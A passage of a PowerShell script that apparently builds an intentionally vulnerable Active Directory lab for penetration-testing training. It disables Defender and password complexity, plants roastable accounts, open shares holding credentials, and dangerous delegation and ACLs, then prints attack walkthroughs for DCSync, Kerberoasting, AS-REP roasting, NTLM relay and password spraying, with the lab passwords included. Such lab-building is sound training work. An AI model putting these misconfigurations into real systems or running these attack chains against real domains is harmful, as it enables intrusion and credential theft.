            Write-ColorOutput "[!] WARNING: Server is not a DC, but Stage3 was specified." "Yellow"
            Write-ColorOutput "[!] Please run Stage1 and Stage2 first." "Yellow"
            exit 1
        }
    } else {
        # Auto mode - detect based on DC status
        if ($isDC) {
            # Check if Stage 2 has been run (check for vulnerable accounts via registry/ADWS)
            $stage2Complete = $false
            try {
                Import-Module ActiveDirectory -ErrorAction SilentlyContinue
                $vulnUsers = Get-ADUser -Filter "Name -eq 'svc_backup'" -ErrorAction SilentlyContinue
                if ($vulnUsers) {
                    $stage2Complete = $true
                }
            } catch {
                # ADWS not available yet, assume Stage 2 not complete
            }
            
            if ($stage2Complete) {
                Write-ColorOutput "[*] Auto mode: Server is a DC with Stage2 complete, running Stage3" "Yellow"
                $runStage3 = $true
            } else {
                Write-ColorOutput "[*] Auto mode: Server is a DC, running Stage2" "Yellow"
                $runStage2 = $true
            }
        } else {
            Write-ColorOutput "[*] Auto mode: Server is not a DC, running Stage1" "Yellow"
            $runStage1 = $true
        }
    }
    
    if ($isDC) {
        # Note: We skip ADWS check here - it will be checked in Stage 2
        Write-ColorOutput "[+] Server is already a Domain Controller" "Green"
        Write-ColorOutput "[*] AD Web Services availability will be checked in Stage 2" "Yellow"
    }
    
    # ========================================
    # STAGE 1: Install AD DS and Promote to DC
    # ========================================
    if ($runStage1) {
        Write-ColorOutput "" "White"
        Write-ColorOutput "========================================" "Cyan"
        Write-ColorOutput "  STAGE 1: Domain Controller Setup" "Cyan"
        Write-ColorOutput "========================================" "Cyan"
        Write-ColorOutput "" "White"
        
        # Step 0: Configure network (DNS settings)
        Set-NetworkConfiguration
        
        # Step 1: Install AD DS and required components
        Install-ADDSRole
        
        # Step 2: Create domain and promote to DC (will reboot)
        if (-not $AdminPassword) {
            $AdminPassword = $SafeModePassword
        }
        $domain = New-ADDomain -Domain $DomainName -DSRMPassword $SafeModePassword -AdminPassword $AdminPassword
        
        # Script will not continue past this point due to reboot
        # User must run script again after reboot
        Write-ColorOutput "" "White"
        Write-ColorOutput "[!] ========================================" "Yellow"
        Write-ColorOutput "[!] STAGE 1 COMPLETE - Server Rebooting" "Yellow"
        Write-ColorOutput "[!] ========================================" "Yellow"
        Write-ColorOutput "[!] After reboot, run the script with Stage2:" "Yellow"
        Write-ColorOutput "[!]   .\Setup-VulnerableAD.ps1 -Stage Stage2 -DomainName `"$DomainName`" -SafeModePassword `$securePass" "White"
        Write-ColorOutput "" "White"
        exit 0
    }
    
    # ========================================
    # STAGE 2: Configure AD Environment
    # ========================================
    if ($runStage2) {
        Write-ColorOutput "" "White"
        Write-ColorOutput "========================================" "Cyan"
        Write-ColorOutput "  STAGE 2: AD Configuration" "Cyan"
        Write-ColorOutput "========================================" "Cyan"
        Write-ColorOutput "" "White"
        
        # Check if running as domain admin (after AD connection is established)
        Write-ColorOutput "[*] Verifying user privileges..." "Yellow"
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        Write-ColorOutput "  [*] Running as: $currentUser" "Yellow"
        
        Write-ColorOutput "[*] Starting AD configuration..." "Yellow"
        
        # Wait for AD Web Services to be available (required for AD operations)
        # This is especially important after a reboot when ADWS may not be ready yet
        Write-ColorOutput "" "White"
        Write-ColorOutput "[*] Waiting for Active Directory Web Services to be available..." "Yellow"
        Write-ColorOutput "[*] This may take a few minutes after DC promotion/reboot..." "Yellow"
        $adwsAvailable = Wait-ADWebServices -MaxWaitSeconds 600 -RetryIntervalSeconds 10
        
        if (-not $adwsAvailable) {
            Write-ColorOutput "" "White"
            Write-ColorOutput "[!] WARNING: AD Web Services did not become available" "Red"
            Write-ColorOutput "[!] The script will attempt to continue, but AD operations may fail" "Yellow"
            Write-ColorOutput "[!] If you see errors, wait a few more minutes and try again" "Yellow"
            Write-ColorOutput "" "White"
        }
        
        # Check AD services and try to connect to AD
        Write-ColorOutput "[*] Checking AD services and connectivity..." "Yellow"
        
        # Check critical services
        $adwsService = Get-Service -Name "ADWS" -ErrorAction SilentlyContinue
        $ntdsService = Get-Service -Name "NTDS" -ErrorAction SilentlyContinue
        $dnsService = Get-Service -Name "DNS" -ErrorAction SilentlyContinue
        
        Write-ColorOutput "  [*] ADWS Service: $(if ($adwsService) { $adwsService.Status } else { 'Not Found' })" "Yellow"
        Write-ColorOutput "  [*] NTDS Service: $(if ($ntdsService) { $ntdsService.Status } else { 'Not Found' })" "Yellow"
        Write-ColorOutput "  [*] DNS Service: $(if ($dnsService) { $dnsService.Status } else { 'Not Found' })" "Yellow"
        
        # Try to import AD module and connect
        $adConnected = $false
        try {
            Import-Module ActiveDirectory -ErrorAction Stop -Force
            Write-ColorOutput "  [*] ActiveDirectory module imported" "Green"
            
            # Try to connect to AD - first try default, then try localhost explicitly
            try {
                $domain = Get-ADDomain -ErrorAction Stop
                Write-ColorOutput "[+] Connected to AD domain: $($domain.DNSRoot)" "Green"
                $adConnected = $true
            } catch {
                Write-ColorOutput "  [*] Default connection failed, trying localhost..." "Yellow"
                try {
                    # Try connecting to localhost explicitly
                    $domain = Get-ADDomain -Server localhost -ErrorAction Stop
                    Write-ColorOutput "[+] Connected to AD domain via localhost: $($domain.DNSRoot)" "Green"
                    $adConnected = $true
                } catch {
                    Write-ColorOutput "  [!] Localhost connection also failed" "Yellow"
                }
            }
            
            # After successful connection, verify domain admin privileges
            if ($adConnected) {
                Write-ColorOutput "[*] Verifying domain administrator privileges..." "Yellow"
                $isDomainAdmin = Test-DomainAdmin
                if ($isDomainAdmin) {
                    Write-ColorOutput "[+] User has domain administrator privileges" "Green"
                } else {
                    Write-ColorOutput "[!] WARNING: User may not have domain administrator privileges" "Yellow"
                    Write-ColorOutput "[!] Stage2 requires domain admin to create OUs, users, and groups" "Yellow"
                    Write-ColorOutput "[*] Attempting to continue anyway..." "Yellow"
                }
            }
        } catch {
            Write-ColorOutput "  [!] Failed to import ActiveDirectory module: $($_.Exception.Message)" "Red"
        }
        
        if (-not $adConnected) {
            Write-ColorOutput "" "White"
            Write-ColorOutput "[!] Cannot connect to Active Directory" "Red"
            Write-ColorOutput "[!] AD Web Services may not be running or AD DS may not be fully initialized" "Red"
            Write-ColorOutput "" "White"
            Write-ColorOutput "[*] Diagnostic Information:" "Yellow"
            
            # Check if NTDS is running (required for AD) - try to start it
            if ($ntdsService) {
                if ($ntdsService.Status -ne "Running") {
                    Write-ColorOutput "  [!] NTDS service is not running - this is required for AD" "Red"
                    Write-ColorOutput "  [*] Attempting to start NTDS service..." "Yellow"
                    try {
                        Start-Service -Name "NTDS" -ErrorAction Stop
                        Write-ColorOutput "  [+] NTDS service started successfully" "Green"
                        Start-Sleep -Seconds 10
                        # Now try to start ADWS again
                        if ($adwsService -and $adwsService.Status -ne "Running") {
                            Write-ColorOutput "  [*] Attempting to start ADWS service..." "Yellow"
                            try {
                                Start-Service -Name "ADWS" -ErrorAction Stop
                                Write-ColorOutput "  [+] ADWS service started successfully" "Green"
                                Start-Sleep -Seconds 5
                                # Retry connection
                                Write-ColorOutput "  [*] Retrying AD connection..." "Yellow"
                                try {
                                    $domain = Get-ADDomain -ErrorAction Stop
                                    Write-ColorOutput "[+] Connected to AD domain: $($domain.DNSRoot)" "Green"
                                    $adConnected = $true
                                } catch {
                                    Write-ColorOutput "  [!] Still cannot connect after starting services" "Yellow"
                                }
                            } catch {
                                Write-ColorOutput "  [!] Could not start ADWS: $($_.Exception.Message)" "Yellow"
                            }
                        }
                    } catch {
                        Write-ColorOutput "  [!] Could not start NTDS: $($_.Exception.Message)" "Red"
                        Write-ColorOutput "  [*] NTDS may need the server to be restarted or AD DS may not be properly configured" "Yellow"
                    }
                } else {
                    Write-ColorOutput "  [+] NTDS service is running" "Green"
                }
            } else {
                Write-ColorOutput "  [!] NTDS service not found - AD DS may not be properly installed" "Red"
            }
            
            # Check ADWS dependencies
            if ($adwsService) {
                if ($adwsService.Status -ne "Running") {
                    Write-ColorOutput "  [!] ADWS service is stopped" "Red"
                    Write-ColorOutput "  [*] ADWS may depend on other services. Checking dependencies..." "Yellow"
                    
                    # Try to get service dependencies
                    try {
                        $adwsDeps = (Get-Service -Name "ADWS").ServicesDependedOn
                        Write-ColorOutput "  [*] ADWS depends on: $($adwsDeps.Name -join ', ')" "Yellow"
                        foreach ($dep in $adwsDeps) {
                            $depSvc = Get-Service -Name $dep.Name -ErrorAction SilentlyContinue
                            if ($depSvc) {
                                Write-ColorOutput "    - $($dep.Name): $($depSvc.Status)" "$(if ($depSvc.Status -eq 'Running') { 'Green' } else { 'Red' })"
                            }
                        }
                    } catch {
                        Write-ColorOutput "  [*] Could not check ADWS dependencies" "Yellow"
                    }
                }
            }
            
            Write-ColorOutput "" "White"
            Write-ColorOutput "[*] Recommended Actions:" "Yellow"
            Write-ColorOutput "    1. Ensure NTDS service is running: Start-Service NTDS" "White"
            Write-ColorOutput "    2. Wait 2-5 minutes after DC promotion for all services to initialize" "White"
            Write-ColorOutput "    3. Restart the server if services won't start" "White"
            Write-ColorOutput "    4. Check Event Viewer for AD DS errors" "White"
            Write-ColorOutput "    5. Verify DC promotion completed successfully" "White"
            Write-ColorOutput "" "White"
            Write-ColorOutput "[!] Exiting Stage2. Please fix AD services and try again." "Red"
            exit 1
        }
        
        # Verify domain membership
        Write-ColorOutput "[*] Verifying domain membership..." "Yellow"
        $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
        $currentDomain = $computerSystem.Domain
        
        # Get the actual domain from AD (if available)
        $actualDomain = $null
        try {
            $adDomain = Get-ADDomain -ErrorAction SilentlyContinue
            if ($adDomain) {
                $actualDomain = $adDomain.DNSRoot
            }
        } catch {
            # ADWS might not be fully ready yet
        }
        
        # If domain name was provided but doesn't match, try to use the actual domain
        if ($actualDomain -and $DomainName -ne $actualDomain) {
            Write-ColorOutput "  [*] Domain name provided ($DomainName) differs from actual domain ($actualDomain)" "Yellow"
            Write-ColorOutput "  [*] Using actual domain: $actualDomain" "Green"
            $DomainName = $actualDomain
        }
        
        $domainParts = $DomainName.Split('.')
        $expectedDomain = $domainParts[0].ToUpper()
        
        Write-ColorOutput "  [*] Current domain: $currentDomain" "Yellow"
        Write-ColorOutput "  [*] Expected domain: $DomainName" "Yellow"
        
        if ($currentDomain -eq $DomainName -or $currentDomain -eq $expectedDomain -or $currentDomain -like "*$DomainName*") {
            Write-ColorOutput "  [+] Server is in the correct domain" "Green"
        } else {
            Write-ColorOutput "  [!] Server domain membership mismatch!" "Red"
            Write-ColorOutput "  [*] Current: $currentDomain" "Yellow"
            Write-ColorOutput "  [*] Expected: $DomainName" "Yellow"
            Write-ColorOutput "  [*] This may indicate DC promotion did not complete successfully" "Yellow"
            Write-ColorOutput "  [*] Attempting to verify DC status..." "Yellow"
            
            # Check if server is actually a DC
            if (Test-IsDomainController) {
                Write-ColorOutput "  [+] Server is a Domain Controller" "Green"
                Write-ColorOutput "  [*] Domain name may differ due to NetBIOS name" "Yellow"
                Write-ColorOutput "  [*] Using actual domain from AD: $actualDomain" "Green"
                if ($actualDomain) {
                    $DomainName = $actualDomain
                }
                Write-ColorOutput "  [*] Continuing with configuration..." "Yellow"
            } else {
                Write-ColorOutput "  [!] Server is not a Domain Controller!" "Red"
                Write-ColorOutput "  [!] DC promotion may have failed" "Red"
                Write-ColorOutput "  [*] Please check Event Viewer and verify DC promotion completed" "Yellow"
                Write-ColorOutput "  [*] You may need to run Stage1 again" "Yellow"
                exit 1
            }
        }
        
        # Quick verification of DC configuration
        Write-ColorOutput "[*] Verifying Domain Controller configuration..." "Yellow"
        $dcVerified = Test-DomainControllerConfiguration
        if (-not $dcVerified) {
            Write-ColorOutput "[!] Domain Controller verification failed. Some services may not be running." "Yellow"
            Write-ColorOutput "[*] Continuing with configuration anyway..." "Yellow"
        }
        
        # Step 3: Disable password complexity (must be done before creating users)
        Write-ColorOutput "" "White"
        Write-ColorOutput "[*] Progress: Disabling Password Complexity Requirements..." "Yellow"
        Disable-PasswordComplexity
        
        # Step 4: Create OUs
        Write-ColorOutput "[*] Progress: Creating Organizational Units..." "Yellow"
        New-RealisticOUs
        
        # Step 5: Disable Windows Defender (required for testing attacks)
        Write-ColorOutput "[*] Progress: Disabling Windows Defender..." "Yellow"
        Disable-WindowsDefender
        
        # Step 6: Create groups
        Write-ColorOutput "[*] Progress: Creating Security Groups..." "Yellow"
        New-RealisticGroups
        
        # Step 7: Create users
        Write-ColorOutput "[*] Progress: Creating Users..." "Yellow"
        New-RealisticUsers
        
        # Step 8: Create vulnerable Kerberos users
        Write-ColorOutput "[*] Progress: Creating Vulnerable Kerberos Accounts..." "Yellow"
        New-VulnerableKerberosUsers
        
        # Step 8.5: Add users to groups based on departments and roles
        Write-ColorOutput "[*] Progress: Adding Users to Groups..." "Yellow"
        Add-UsersToGroups
        
        # Step 9: Enable WinRM
        Write-ColorOutput "[*] Progress: Enabling WinRM..." "Yellow"
        Enable-WinRMService
        
        # Step 10: Create SMB shares
        Write-ColorOutput "[*] Progress: Creating SMB Shares..." "Yellow"
        New-SMBShares
        
        # Step 11: Create realistic files
        Write-ColorOutput "[*] Progress: Creating Files in Shares..." "Yellow"
        New-RealisticFiles
        
        # Step 12: Enable LLMNR for Responder (NetBIOS disabled)
        Write-ColorOutput "[*] Progress: Configuring LLMNR for Responder (NetBIOS disabled)..." "Yellow"
        Enable-ResponderProtocols
        
        # Step 13: Configure NTLM
        Write-ColorOutput "[*] Progress: Configuring NTLM for Responder..." "Yellow"
        Enable-NTLMRelay
        
        Write-ColorOutput "" "White"
        Write-ColorOutput "[+] ========================================" "Green"
        Write-ColorOutput "[+] STAGE 2 COMPLETE" "Green"
        Write-ColorOutput "[+] ========================================" "Green"
        Write-ColorOutput "" "White"
    }

    # ========================================
    # STAGE 3: Deploy Advanced Vulnerable Attack Paths
    # ========================================
    if ($runStage3) {
        Write-ColorOutput "" "White"
        Write-ColorOutput "========================================" "Cyan"
        Write-ColorOutput "  STAGE 3: Advanced Attack Paths" "Cyan"
        Write-ColorOutput "========================================" "Cyan"
        Write-ColorOutput "" "White"
        
        # Wait for AD Web Services to be available
        Write-ColorOutput "[*] Waiting for Active Directory Web Services to be available..." "Yellow"
        $adwsAvailable = Wait-ADWebServices -MaxWaitSeconds 300 -RetryIntervalSeconds 10
        
        if (-not $adwsAvailable) {
            Write-ColorOutput "[!] WARNING: AD Web Services did not become available" "Red"
            Write-ColorOutput "[!] The script will attempt to continue, but some operations may fail" "Yellow"
            Write-ColorOutput "" "White"
        }
        
        # Verify domain admin privileges
        Write-ColorOutput "[*] Verifying domain administrator privileges..." "Yellow"
        $isDomainAdmin = Test-DomainAdmin
        if (-not $isDomainAdmin) {
            Write-ColorOutput "[!] WARNING: User may not have domain administrator privileges" "Yellow"
            Write-ColorOutput "[!] Stage3 requires domain admin to configure delegation, ACLs, and GPOs" "Yellow"
            Write-ColorOutput "[*] Attempting to continue anyway..." "Yellow"
        } else {
            Write-ColorOutput "[+] User has domain administrator privileges" "Green"
        }
        
        Write-ColorOutput "" "White"
        Write-ColorOutput "[*] Deploying advanced vulnerable attack paths..." "Yellow"
        Write-ColorOutput "" "White"
        
        # Step 1: Unconstrained Delegation
        Write-ColorOutput "[*] Progress: Configuring Unconstrained Delegation..." "Yellow"
        Set-UnconstrainedDelegation
        
        # Step 2: Constrained Delegation
        Write-ColorOutput "[*] Progress: Configuring Constrained Delegation..." "Yellow"
        Set-ConstrainedDelegation
        
        # Step 3: Resource-Based Constrained Delegation
        Write-ColorOutput "[*] Progress: Configuring Resource-Based Constrained Delegation..." "Yellow"
        Set-ResourceBasedConstrainedDelegation
        
        # Step 4: Dangerous ACLs
        Write-ColorOutput "[*] Progress: Configuring Dangerous ACLs..." "Yellow"
        Set-DangerousACLs
        
        # Step 5: Vulnerable GPOs
        Write-ColorOutput "[*] Progress: Creating Vulnerable GPOs..." "Yellow"
        New-VulnerableGPOs
        
        # Step 6: Password Not Required Accounts
        Write-ColorOutput "[*] Progress: Creating Password Not Required Accounts..." "Yellow"
        New-PasswordNotRequiredAccounts
        
        # Step 7: Sensitive Data in Attributes (do this first)
        Write-ColorOutput "[*] Progress: Adding Sensitive Data to User Attributes..." "Yellow"
        Set-SensitiveDataInAttributes
        
        # Step 7.5: Set userPassword Attribute (LDAP password disclosure)
        Write-ColorOutput "[*] Progress: Setting userPassword Attribute for LDAP Disclosure..." "Yellow"
        Set-UserPasswordAttribute
        
        # Step 8: Passwords in Descriptions (Information Disclosure) - Always overwrites descriptions
        Write-ColorOutput "[*] Progress: Adding Realistic Descriptions with Tokens and Passwords..." "Yellow"
        Set-PasswordsInDescriptions
        
        # Step 9: Responder Simulation Setup
        Write-ColorOutput "" "White"
        Write-ColorOutput "========================================" "Yellow"
        Write-ColorOutput "  RESPONDER SIMULATION SETUP (Optional)" "Yellow"
        Write-ColorOutput "========================================" "Yellow"
        Write-ColorOutput ""
        Write-ColorOutput "Would you like to set up automated Responder triggers?" "Yellow"
        Write-ColorOutput "This creates scheduled tasks that simulate users trying to access" "White"
        Write-ColorOutput "non-existent network shares, which triggers LLMNR/NBT-NS queries" "White"
        Write-ColorOutput "that Responder can poison to capture NTLMv2 hashes." "White"
        Write-ColorOutput ""
        Write-ColorOutput "[?] Set up Responder triggers? (Y/N, default: N): " "Yellow" -NoNewline
        $setupResponder = Read-Host
        if ($setupResponder -eq "Y" -or $setupResponder -eq "y") {
            Write-ColorOutput ""
            Write-ColorOutput "[?] Enter the IP address of your Kali/attacker machine running Responder: " "Yellow" -NoNewline
            $attackerIP = Read-Host
            if ($attackerIP -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') {
                Write-ColorOutput "[*] Setting up Responder simulation triggers..." "Yellow"
                Start-RandomResponderTriggers -AttackerIP $attackerIP
            } else {
                Write-ColorOutput "[!] Invalid IP address format. Skipping Responder setup." "Red"
                Write-ColorOutput "[*] You can manually run: Start-RandomResponderTriggers -AttackerIP <your-kali-ip>" "Yellow"
            }
        } else {
            Write-ColorOutput "[*] Skipping Responder trigger setup." "Yellow"
            Write-ColorOutput "[*] You can manually run this later:" "White"
            Write-ColorOutput "    Start-RandomResponderTriggers -AttackerIP <your-kali-ip>" "White"
            Write-ColorOutput ""
        }
        
        Write-ColorOutput "" "White"
        Write-ColorOutput "[+] ========================================" "Green"
        Write-ColorOutput "[+] STAGE 3 COMPLETE" "Green"
        Write-ColorOutput "[+] ========================================" "Green"
        Write-ColorOutput "" "White"
        Write-ColorOutput "========================================" "Green"
        Write-ColorOutput "  Setup Complete!" "Green"
        Write-ColorOutput "========================================" "Green"
        Write-ColorOutput ""
        Write-ColorOutput "Domain: $DomainName" "Cyan"
        Write-ColorOutput "DC: $env:COMPUTERNAME" "Cyan"
        Write-ColorOutput ""
        Write-ColorOutput "Vulnerable Accounts Created:" "Yellow"
        Write-ColorOutput "  - AS-REP Roastable: svc_backup, svc_sql, admin_legacy (DONT_REQUIRE_PREAUTH enabled)" "White"
        Write-ColorOutput "  - Kerberoastable: svc_http, svc_mssql (DOMAIN ADMIN), svc_exchange, svc_iis" "White"
        Write-ColorOutput "  - Privileged: backup_admin (Backup Operators + DCSync rights)" "White"
        Write-ColorOutput "  - Domain Admins: jsmith, mthomas, backup_admin, svc_mssql" "Yellow"
        Write-ColorOutput "  - DNS Admins: crodriguez, jwilson" "Yellow"
        Write-ColorOutput "  - Note: Multiple users in Domain Admins for various attack paths!" "Yellow"
        Write-ColorOutput "  - Note: AS-REP roasting can be done without valid credentials!" "Yellow"
        Write-ColorOutput ""
        Write-ColorOutput "SMB Shares:" "Yellow"
        Write-ColorOutput "  - Shared (OPEN - Anonymous/Guest access, contains credentials.txt!)" "White"
        Write-ColorOutput "  - IT_Documents (credentials.txt contains password!)" "White"
        Write-ColorOutput "  - Finance_Reports" "White"
        Write-ColorOutput "  - Public (Guest accessible)" "White"
        Write-ColorOutput "  - HR_Files" "White"
        Write-ColorOutput "  - Backup" "White"
        Write-ColorOutput ""
        Write-ColorOutput "WinRM: Enabled on port 5985" "Yellow"
        Write-ColorOutput "LLMNR: Enabled for Responder (NetBIOS disabled)" "Yellow"
        Write-ColorOutput "NTLM: Configured for responder/ntlmrelayx" "Yellow"
        Write-ColorOutput ""
        Write-ColorOutput "Setup Summary:" "Yellow"
        Write-ColorOutput "  - Domain Controller: Configured" "White"
        Write-ColorOutput "  - Users, Groups, OUs: Created" "White"
        Write-ColorOutput "  - Vulnerable Accounts: Configured" "White"
        Write-ColorOutput "  - SMB Shares: Created" "White"
        Write-ColorOutput "  - WinRM: Enabled" "White"
        Write-ColorOutput "  - LLMNR: Enabled for Responder (NetBIOS disabled to force LLMNR)" "White"
        Write-ColorOutput ""
        Write-ColorOutput "The lab is ready for penetration testing training!" "Green"
        Write-ColorOutput ""
        Write-ColorOutput "INITIAL ATTACK PATH (Open Share with Credentials):" "Yellow"
        Write-ColorOutput "  1. Access the open share (no authentication required):" "White"
        Write-ColorOutput "     smbclient //<DC_IP>/Shared -N" "Cyan"
        Write-ColorOutput "     or: smbclient //<DC_IP>/Shared -U guest" "Cyan"
        Write-ColorOutput "  2. Download credentials.txt file:" "White"
        Write-ColorOutput "     get credentials.txt" "Cyan"
        Write-ColorOutput "  3. Use credentials to access the system:" "White"
        Write-ColorOutput "     evil-winrm -i <DC_IP> -u backup_admin -p 'robert'" "Cyan"
        Write-ColorOutput "  4. Escalate to Domain Admin using backup_admin privileges:" "White"
        Write-ColorOutput "     Method 1 - DCSync Attack (backup_admin has replication rights):" "Cyan"
        Write-ColorOutput "       secretsdump.py backup_admin:'robert'@<DC_IP>" "Cyan"
        Write-ColorOutput "       or: mimikatz 'lsadump::dcsync /user:Administrator'" "Cyan"
        Write-ColorOutput "     Method 2 - SeBackupPrivilege abuse:" "Cyan"
        Write-ColorOutput "       Use diskshadow or vssadmin to create shadow copy" "Cyan"
        Write-ColorOutput "       Extract SAM/LSA secrets from shadow copy" "Cyan"
        Write-ColorOutput "     Method 3 - Abuse service accounts or scheduled tasks" "Cyan"
        Write-ColorOutput "       Create scheduled task as SYSTEM or modify existing services" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "KERBEROASTING ATTACK PATH (Service Account to Domain Admin):" "Yellow"
        Write-ColorOutput "  1. Enumerate service accounts with SPNs:" "White"
        Write-ColorOutput "     GetUserSPNs.py -dc-ip <DC_IP> $DomainName/<valid_user>:<password> -request" "Cyan"
        Write-ColorOutput "     Example: GetUserSPNs.py -dc-ip 192.168.72.129 $DomainName/jsmith:Password1 -request" "Cyan"
        Write-ColorOutput "  2. Crack the Kerberoasted hash:" "White"
        Write-ColorOutput "     hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt" "Cyan"
        Write-ColorOutput "     or: john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hash.txt" "Cyan"
        Write-ColorOutput "  3. Use cracked password to access as Domain Admin:" "White"
        Write-ColorOutput "     svc_mssql password: mustang" "Cyan"
        Write-ColorOutput "     evil-winrm -i <DC_IP> -u svc_mssql -p 'mustang'" "Cyan"
        Write-ColorOutput "  4. Verify Domain Admin access:" "White"
        Write-ColorOutput "     whoami /groups (should show Domain Admins)" "Cyan"
        Write-ColorOutput "     net user administrator (can view/modify Domain Admin)" "Cyan"
        Write-ColorOutput "     Note: svc_mssql is a member of Domain Admins group" "Yellow"
        Write-ColorOutput "" "White"
        Write-ColorOutput "AS-REP ROASTING ATTACK PATH (No Pre-Authentication to Domain Admin):" "Yellow"
        Write-ColorOutput "  1. Enumerate users with DONT_REQUIRE_PREAUTH (AS-REP roastable):" "White"
        Write-ColorOutput "     GetNPUsers.py -dc-ip <DC_IP> $DomainName/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt" "Cyan"
        Write-ColorOutput "     Example: GetNPUsers.py -dc-ip 192.168.72.129 $DomainName/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt" "Cyan"
        Write-ColorOutput "     Or without a user list (requires valid credentials):" "White"
        Write-ColorOutput "     GetNPUsers.py -dc-ip <DC_IP> $DomainName/<valid_user>:<password> -request" "Cyan"
        Write-ColorOutput "     Example: GetNPUsers.py -dc-ip 192.168.72.129 $DomainName/jsmith:Password1 -request" "Cyan"
        Write-ColorOutput "  2. Identify AS-REP roastable accounts (accounts that return hashes):" "White"
        Write-ColorOutput "     Vulnerable accounts: svc_backup, svc_sql, admin_legacy" "Cyan"
        Write-ColorOutput "     These accounts have DONT_REQUIRE_PREAUTH enabled" "Yellow"
        Write-ColorOutput "  3. Crack the AS-REP hash:" "White"
        Write-ColorOutput "     hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt" "Cyan"
        Write-ColorOutput "     or: john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep_hashes.txt" "Cyan"
        Write-ColorOutput "  4. Use cracked password to access the system:" "White"
        Write-ColorOutput "     svc_backup password: welcome" "Cyan"
        Write-ColorOutput "     svc_sql password: football" "Cyan"
        Write-ColorOutput "     admin_legacy password: jesus" "Cyan"
        Write-ColorOutput "     evil-winrm -i <DC_IP> -u <username> -p '<password>'" "Cyan"
        Write-ColorOutput "     Example: evil-winrm -i 192.168.72.129 -u svc_backup -p 'welcome'" "Cyan"
        Write-ColorOutput "  5. Escalate privileges from service account:" "White"
        Write-ColorOutput "     Check group membership: net user <username> /domain" "Cyan"
        Write-ColorOutput "     Look for additional attack paths (Kerberoasting, delegation, etc.)" "Cyan"
        Write-ColorOutput "     Note: AS-REP roasting gives you credentials, then pivot to other attacks" "Yellow"
        Write-ColorOutput "" "White"
        Write-ColorOutput "Next Steps:" "Yellow"
        Write-ColorOutput "  1. From Kali Linux, configure /etc/hosts to point $DomainName to this server's IP" "White"
        Write-ColorOutput "  2. Use responder or ntlmrelayx to capture hashes" "White"
        Write-ColorOutput "  3. Use evil-winrm to connect: evil-winrm -i <IP> -u <user> -p <pass>" "White"
        Write-ColorOutput "  4. Try AS-REP roasting: GetNPUsers.py -dc-ip <IP> <domain>/<user> -request" "White"
        Write-ColorOutput "  5. Try Kerberoasting: GetUserSPNs.py -dc-ip <IP> <domain>/<user>:<pass>" "White"
        Write-ColorOutput "" "White"
        Write-ColorOutput "KERBRUTE COMMANDS (Username Enumeration & Password Spraying):" "Yellow"
        Write-ColorOutput "  Username Enumeration (find valid accounts):" "White"
        Write-ColorOutput "    kerbrute userenum -d $DomainName --dc <DC_IP> usernames.txt" "Cyan"
        Write-ColorOutput "    Example: kerbrute userenum -d $DomainName --dc 192.168.72.129 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt" "Cyan"
        Write-ColorOutput "    Quick test: kerbrute userenum -d $DomainName --dc <DC_IP> users.txt" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "  Password Spraying (try one password against many users):" "White"
        Write-ColorOutput "    kerbrute passwordspray -d $DomainName --dc <DC_IP> usernames.txt '<password>'" "Cyan"
        Write-ColorOutput "    Example: kerbrute passwordspray -d $DomainName --dc 192.168.72.129 users.txt 'password'" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "  Brute Force Single User (try many passwords for one user):" "White"
        Write-ColorOutput "    kerbrute bruteuser -d $DomainName --dc <DC_IP> passwords.txt <username>" "Cyan"
        Write-ColorOutput "    Example: kerbrute bruteuser -d $DomainName --dc 192.168.72.129 passwords.txt jsmith" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "  Create a users.txt file with common usernames from this lab:" "White"
        Write-ColorOutput "    echo -e 'jsmith\nsjohnson\ndjones\njgarcia\ncrodriguez\nmwilliams\nebrown\nrmiller\nadavis\nmmartinez\ndhernandez\nllopez\njwilson\npanderson\nmthomas\njohn\njane\ntest\nadmin\nuser\njohnsmith\nsarahjohnson\nmichaelbrown' > users.txt" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "  Note: Replace <DC_IP> with your Domain Controller's IP address" "White"
        Write-ColorOutput "        All usernames in this lab are in xato-net-10-million-usernames.txt" "White"
        Write-ColorOutput "        All user passwords are from rockyou.txt (top common passwords)" "Yellow"
        Write-ColorOutput "        Common usernames: jsmith, john, jane, test, admin, user, johnsmith" "White"
        Write-ColorOutput "        Common passwords: password, 123456, qwerty, abc123, letmein, etc." "White"
        Write-ColorOutput ""
        Write-ColorOutput "Advanced Vulnerable Attack Paths:" "Yellow"
        Write-ColorOutput "  - Unconstrained Delegation: svc_delegation (Password: Delegation2024!)" "White"
        Write-ColorOutput "  - Constrained Delegation: svc_constrained (Password: Constrained2024!)" "White"
        Write-ColorOutput "  - Resource-Based Constrained Delegation: svc_rbcd (Password: RBCDService2024!)" "White"
        Write-ColorOutput "  - Dangerous ACLs: svc_replication (Password: thomas) - Has DCSync and WriteDACL" "White"
        Write-ColorOutput "    Note: Realistic misconfiguration - legitimate replication service account with excessive permissions" "Cyan"
        Write-ColorOutput "  - Vulnerable GPOs: WeakPasswordPolicy, PlaintextPasswords" "White"
        Write-ColorOutput "  - Password Not Required: svc_nopass, guest_nopass" "White"
        Write-ColorOutput "  - Passwords in Descriptions: All user passwords added to AD description field" "White"
        Write-ColorOutput "  - Sensitive Data: Added to user attributes (description, info fields)" "White"
        Write-ColorOutput "  - userPassword Attribute: Passwords stored in LDAP userPassword attribute (retrievable via LDAP)" "White"
        Write-ColorOutput "    Attack: nxc ldap <DC_IP> -d <domain> -u <user> -p <pass> -M get-userPassword" "Cyan"
        Write-ColorOutput ""
        Write-ColorOutput "Attack Techniques to Practice:" "Yellow"
        Write-ColorOutput "  1. Unconstrained Delegation Abuse (PrintNightmare, SpoolSample)" "White"
        Write-ColorOutput "  2. Constrained Delegation Abuse (S4U2Self/S4U2Proxy)" "White"
